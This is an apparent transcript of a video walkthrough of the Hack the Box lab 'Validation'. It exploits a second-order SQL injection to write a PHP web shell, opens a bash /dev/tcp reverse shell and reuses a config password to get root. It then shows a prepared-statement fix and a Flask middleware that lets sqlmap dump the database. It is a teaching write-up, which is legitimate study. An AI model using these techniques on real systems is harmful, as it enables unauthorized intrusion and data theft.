 what's going on youtube is ipsec doing validation from the ultimate hacking championships september qualifiers and this box is now playable on hack the box the uhc september qualifiers is always the first friday of the month and the first 10 people to complete it or get the furthest on this machine earn this spot in the uhc september finals which is the last sunday of the month and this one is going to be on the 26. the box is an easy box essentially it's just a second order sql injection but we're going to go into a lot of stuff after we solve the box so let's just jump in as always we start with an n map so sc for default scripts sv enumerate versions o a output all formats bring the nmap directory and call it validation and then the ip address of 1010 11.116 this can take some time to run so i've already ran it looking at the results we have a handful of ports open the very first one is ssh on port 22 and it's banner tells us it's an ubuntu server then we have http on port 80 and its banner is telling us it is debian so apache ali is saying debian and ssh is saying ubuntu in like real-world situations this normally means the ip address you're scanning is a firewall or a router and it's doing some type of gnat or a network address translation or maybe it's pat port address translation those two kind of get um lumped together as the same thing so often but essentially it means different ports go to different boxes because you have a huge network and just one ip address however in ctfs it generally means there's some type of nested virtualization either like vms or docker containers and in this case it's going to be a docker container and at the end of the video we'll kind of go over this a little bit and then we have ports 5000 of 5004 just filtered probably means iptables has blocked them and then on port 8080 engine x is open but it just reports bad gateway so let's go and just check out the website since port 80 looks like where it has the most information going to 101011.1 we can see a page that has a registration just says join the uhc september qualifiers and if we put a username here and click register it says welcome and then other players in this area so if i go back and we do let's say please subscribe we can see ipsec and please subscribe or playing in brazil and we can just do um test user put them in a different country to see exactly what is going on here so nothing too special uh we can go into burp suite turn interception on click join now and then let's try something weird um i'm going to do a single quote after the country because it looks like we can edit the country this is a drop down a combo box so we generally can't edit it but if we intercept it it's just sending plain text so um let's do another unique username of let's just say ip send it over to the repeater tab and we have a 302 found it puts the cookie as this and then redirects us so i'm going to click follow redirection and uh it did not rewrite my cookie so i noticed the old country was there so when you click follow redirect um if there's a set cookie thing in burp suite it looks like it won't set it and we can see welcome ip other players in brazil with this single quote and then it's a sql error saying call to member function fetch association on boolean so the sql query returned zero results and it was expecting a result so it crashed that's what that error message is and the weird thing also is if we go back and we keep sending this registration we're getting something static here right it's always 0d 9 whatever so i'm going to grab this cookie because this looks like it could be another finding if we're just doing a basic pen test and we can see it is 32 characters so chances are this is a md5 sum uh we use the username ip so if i just do md5 some here we can predict the cookie because that matches so all this cookie is is doing an md5 of your username if we want to see that sql error message inside of booksuite we can edit the cookie so all i did was press f12 to bring up the developer bar then go to storage cookies and then edit the user cookie to be the one i want we can turn brick suite off go to slash account.php [Music] and that is the wrong cookie we want 0d there we go refresh and now we have this one uncaught error so there is a second order sql injection and what that means is the data that the sql query is pulling out of the database is tainted and has an issue you find this in applications because a lot of developers just have the mindset of don't trust any data coming from the user so they always put some type of sanitization around that data and they generally may trust data coming from the database because it's not the user right in their mind the data was in the database this is a trusted data source so i don't have to do all my sanitization there but if you can put bad data into the database then it gets trusted and when they use it for a future query uh that fails so we can go over the source code once we get a shell on the box um i'm going to change my username to shell so we get a new cookie and we can um actually this would be a new because we want to find a valid union injection for this so when do a single quote then union select one and then a comment and if this passes then we know the sql query is only expecting one column if this fails then i'm going to do union select two so going here let's copy this new cookie go over to firefox and see what happens so it looks like it passed other players playing in brazil and we got our first two users ipsec and please subscribe then we also have this one so uh the query worked just fine if we wanted to we can call this fail and we can do union select two copy the cookie paste it in and we can see if we have a unbalanced number of parameters on the statement it fails and by unbalanced i mean the sql query the page is using is expecting one column and our union is specifying two so two on one side one the other becomes unbalanced and fails so now we know we can put data here uh we can put any data actually so this is going to be sql injection here i'll just call it fail 2 or actually this is going to be a num2 i guess but if i paste this we can see the union injection put sql injection here so we can make this be anything we want so what i'm going to do is put a web shell so we'll do php and then system request and we can use single quotes like that and then we can say into out file and ver www.html this is the default web directory of linux boxes and i'll just call this shell.php and the username i'll put a shell we can copy the cookie refresh and we actually error but i think the error is what we're expecting because we wrote the results into an out file so it didn't return anything so it errors but if we hit the page it may be there so if i go to shell.php we have ipsec please subscribe and then system can't execute a blank command so we have successfully wrote a shell so if we do cmd equals id i did ip but let's change that over to id we get what we want so let's send this over to burp suite turn intercept off send this and then we can let's see change request method and then do a bash reverse shell so bash c i dev tcp 10 10 14 8 i think it's my ip 9001 0 at and 1 like that let's make sure we're listening nc lvmp 9001 send did not work but i have not url encoded it so i highlight it and then press ctrl u to url and code we don't get a response back which is a good sign that we have a shell so now with the shell i'm going to do python 3 c import pty pty dot spawn spin bash and python 3 is not found if i do which python which python python3 we don't have python i can do find slash put the errors to dev null grip for python and python just isn't installed in this box so we can look at the files on this we could try other methods to get a shell i'm going to try this um i always forget the syntax to this i think it's just script hq then devno bash then let's do stdy raw minus echo fg enter enter yeah i still don't have tabs so that did not do it um let's see i know there's a way to use script to get a tty let's see is it like a dash i flag or something i'm missing flush log out no idea but we can move on we can see there is account config css index and shell so this is what we created uh we're trying to find the database password and that's going to be probably in config so if i cap this file out we can see the username to the database is uhc and then the password is uhc9 qualifier uh ninequal globalpw it be saying global in it is a hint that this password is used elsewhere so we can just try to ask you to it and if i had my clipboard right it would have worked so let's do su dash paste it in and we get root and this is where root.text is and this is a little bit weird than most hack the box machines because we're not escaping the container this web shell is in a docker and the reason why it we i did this is because uhc is a um like public event you don't this vm's not behind a vpn so you have a lot of people attacking this box at the same time so i did some really weird load balancing within docker and a kernel module i wrote so to show that i'm just going to ssh into my dev machine so i think that was 134 i think the user's ubuntu user may be htb let's try that http yeah user was htb so ip.ko was in this directory i had just removed the source code from the box i uploaded a hack the box but we can take a look at the source here and this is a simple kernel module that i wrote a long time ago for sync that we didn't end up using because oxdf had uh created a solution within iptables and we didn't want to put a like hacked together kernel module in a box because who knows where it could fail but i still had the source code around and decided to use it for this box the start of the module is this lkm init function and that's just local kernel module initialization and it's going to print a message that just says the kernel module is loaded and then we have nfho and nfhi this is network filter handle out and network filter handle in and it's just defining it so we can build a hook and then here we have initialize net filter hook for incoming packets and essentially if you just google um nfh0 hook i think you'll get like the um template i used to build this so mfho dash hook let's see yeah this is pretty much what the code is based off of and i think this is just sending it to like iptables afterwards but we put a hook at first and we're calling a function in hook from our application so on the out hook packet is the same exact thing so at the very start we call our parameters so if you're building like a back door that you wanted to work even if iptable's blocked it you could probably insert this in and do a function before it um what we're doing is just rewriting the packet header to go to a different destination so here's this unsigned input hook and all this is doing is checking if it's an ip packet and eventually getting down here and we have the read write destination port i think this is actually um rewrite my horrible naming convention but yeah we're rewriting the destination port to equal the last octet of the ip address modulo 31 plus 5000. so in this case there are 31 ips this could be running and all it's doing is let's see let's go to google real quick google.com the modulo is like a remainder in division so 1 modulo 31 is gonna be one 16 modular 31 is going to be 16 because it's below 31. if we go to 32 now this is going to be 1 because it's 1 above 31. if the last octave the ip was 230 then that changes the number to 13. and then we add the 5000 so now it's 5013. so that's how it's doing its routing we have a lot of docker containers up listing on ports 5000 to 5031 and um it's taking the last octet modular 31 so we always get within the range and then adding it to 5000. so here d port and source port and we're saying if the destination port is equal to 80 then rewrite this header and there is a bug here like when i install this kernel module i can no longer send packets out port 80 because actually no i can um i forget where the bug is but i figured i said that because this is an input hook but if the destination port is 80 then we're rewriting the header to go to the new packet and then going through the normal uh thing same thing with pretty much the output um if the source port is between uh i did four nine nine five zero three two like one blow and one above just because i'm always paranoid about excluding something i think you'd probably get away with 5000 5031 but besides the point then we're rewriting it back to be 80. and we have to do this because when we send this packet we're rewriting it from 80 to let's say 5001 and then that server is responding it thinks the destination was 531 5031 so it sets its source to 5031 when it sends it back to the client and the client's like what is this source i this should be 80. so um that's what this piece is doing so that is the kernel module that um hooks this and if i do it like a docker ps you can see all the containers that are running so that is how that routing works um let's look at the code for sql injection so if i go into dub dub dub i can look at account and this is where we do the second order sql injection so actually we can look at registration first um config no index so this is getting a md5 of the username we're inserting into registration and then if there is a error because this execute this returns a boolean so if this succeeds we exit the code and everything's fine if it fails then it goes on and now we're just updating the user to change where they registered at but this piece of code isn't too important the important thing to go over is the prepared statements so we have this connection to prepared and then we bind param and this ssi this is string string string integer if we look at google and do bind underscore param probably we can probably see all the features find param php let's see we can do w3school as well if this doesn't have it types yeah we can do integer double string and blob i'm guessing blob would be like binary data but these are the parameters so the very first parameter is a string second parameter user hash this is a string uh country string and then the time and that is going to be an integer so doing it this way it's not vulnerable to sql injection we can go into account and we can see the very first thing it's grabbing the let's see what is this grabbing that's association okay country and username we should have two queries here right yeah so we're doing a select username country from registration where user hash is equal to question mark and again this we're going to do a mine param for a prepared statement so sql by prem s passing the user and that is going to be the cookie and we execute and we retrieved two rows newsname and country so with this fetch this is putting the welcome player name then other players in your country is this and here we're doing a second sql statement and there is no like in this select you don't see a question mark and it's just pulling it from the database so this is the prepared statement from above this row and it just passes it to query and because there's no sanitization here then this is just going to be a sql injection because there's nothing in the database preventing the country from being invalid so if we wanted to harden this i mean it would be pretty simple we just do where country is equal to [Music] probably question mark like that and then we can take the code up so take these two lines paste this so we're preparing the sql statement and we do bind param and then this would be row country and then let's see is it sql query no s execute and that would pretty much be oh we need to get result like this there we go so i think this would be the uh working code for it to be fixed um it's a bit pain to rebuild all these dockers so i'm not going to do that but you should get the idea of what a prepared statement is and um how second order sql injection works um yeah so if you have questions leave them in the comments below apologies for the sloppy cut i realized i said i wanted to show exactly how you can create some middleware so sql map can detect this send i forgot to do that so let's do that now the first thing we want to do is verify that sql map will not be able to exploit this box regularly so i'm just going to go here we're going to create a user send to burp suite join and in burp suite let's clear our cache to get to where we want right here copy the file and i'm going to call this um test.request and then we can go here sql map dash r test.request it got a 302 redirect yes we want to follow it redirect as a result of post do you want to resend original post data to new location no we don't because it's just the cookie that we care about on this account.php page and we can see it gets a bunch of weird error messages and then fails so escrow map doesn't like this challenge for whatever reason but we can create some middleware to help sql map out so the very first thing i want to do for this is google a hello world application so python 3 flask hello world and this is just generally how i like creating quick web apps is using flask so if we go here you can read this to set up an environment but the main thing we want is just this piece of code so from flask import whatever so let's call this um [Music] middleware.pi i guess and we can put that on port 80 sudo python3 middleware.pi and when we go to localhost now we get the web application so the goal here is in this web app we do all the logic to get to the sql injection and then we just hand it off to sql map so flask also has a request feature so or request library so from flask import request and this is how we get variables so we want to return i think it's just request dot get actually we can google this request return get variable actually flask there we go return let's see http variables name parameters in url like this request.orgs so it's request ergs get args get country so if we save this run it again and i put a country we can put anything we want here this is pretty much all we need to create the application the next piece is we just have to send the code or send the request so let's get rid of this return and do data equals and we need username and then also the country because this is going to be used to generate the account so we have that and i just want to verify it is username and country so actually we have the test.request we can look at so we're sending a post username equals test country equals brazil and for the username we just want to give it something random i think this may be why sql map was failing we could pass the dash dash eval flag to sqlmap to make username random if you don't know how to do that just go to ipsec.rocks i did a video on that recently or you can do the sql map academy course which covers it but in python i'm just going to do import uuid and for the username we're going to set it to uuid.uuid4.hex if you're curious what that is we can just python 3 import uid uh let's see uid.uid this is a function like that there we go and that's what it looks like it's just a random unique identifier this is like the quickest way i could get random strings and python they do have like a rand int feature but for some reason i just like doing this new uid thing so we have this we need to import request now and this is the um library to send http requests and what we want to do is do request.post http 101011.116 and then we need to send it the data and i'm going to do our equals like this so we can get the response and we can just return our text and we'll see if this works so if i now go to localhost country and then we can say the country is ipsec we get this page so this looks like it'll work so now all we have to do is make this request go to sql map and then test it out so go here refresh this page uh let's see copy to file i'll call this localhost.request and we can go here python or not python3 sql map dash r localhost.request and then i'm going to do dbms mysql to speed it up uh i think it's dash dash dbms maybe and dash dash technique is equal to u for union let's see if this works there we go so now it's testing it um country does not seem to be injectable what if i just take all this out what parameters did i use my sequel let's try this continue so we see heuristic cross-site scripting testers country might be vulnerable to cross-site scripting attacks which is a good sign that it's doing dynamic content so it's just going to run through all these and i'm curious why um when i added all those flags it didn't work so we'll see if this works it's doing my sequel time see country is time sql do we want to skip all the other databases yes and then we're just going to keep going on and it now has that validated that the country is union injectable do i want to keep going no i do not and we have it here so i can just do dash dash dump now and we can dump all the data it's going to try cracking a lot of the passwords but yep this is how you could have created that middleware so hope you guys enjoyed that take care and i will see you all next week